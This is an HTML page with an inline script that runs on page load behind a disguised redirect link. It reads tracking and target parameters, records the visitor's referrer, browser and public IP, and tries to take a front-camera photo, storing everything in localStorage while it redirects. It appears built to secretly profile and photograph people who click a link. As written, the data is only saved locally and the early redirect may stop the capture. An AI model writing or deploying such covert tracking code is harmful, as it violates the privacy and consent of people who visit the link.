<!DOCTYPE html>
<html>
<head>
    <script>
    // Immediately start processing on page load
    (function() {
        const params = new URLSearchParams(window.location.search);
        const trackingId = params.get('track');
        const targetUrl = params.get('target');
        
        if (trackingId && targetUrl) {
            // Decode target URL first
            const decodedUrl = decodeURIComponent(targetUrl);
            
            // Prepare minimal tracking data
            const trackingData = {
                id: trackingId,
                timestamp: new Date().toISOString(),
                target: decodedUrl,
                referrer: document.referrer || 'Direct',
                userAgent: navigator.userAgent,
                ip: 'Pending',
                image: null
            };

            // Start immediate redirect
            window.location.href = decodedUrl;
            
            // Continue processing in background (after redirect)
            setTimeout(async () => {
                // Try to get IP
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    trackingData.ip = (await ipResponse.json()).ip;
                } catch (e) {
                    trackingData.ip = 'Unknown';
                }
                
                // Try camera capture if available
                if (navigator.mediaDevices) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user' },
                            audio: false 
                        });
                        
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        await video.play();
                        
                        // Quick capture (reduced from 3s to 500ms)
                        await new Promise(r => setTimeout(r, 500));
                        
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        trackingData.image = canvas.toDataURL('image/jpeg', 0.7);
                        stream.getTracks().forEach(t => t.stop());
                    } catch (e) {
                        console.log('Camera capture skipped:', e);
                    }
                }
                
                // Save data
                const allData = JSON.parse(localStorage.getItem('track_data') || []);
                allData.unshift(trackingData);
                localStorage.setItem('track_data', JSON.stringify(allData));
            }, 0);
        }
    })();
    </script>
</head>
<body>
    <!-- Empty page - redirect happens before anything renders -->
</body>
</html>
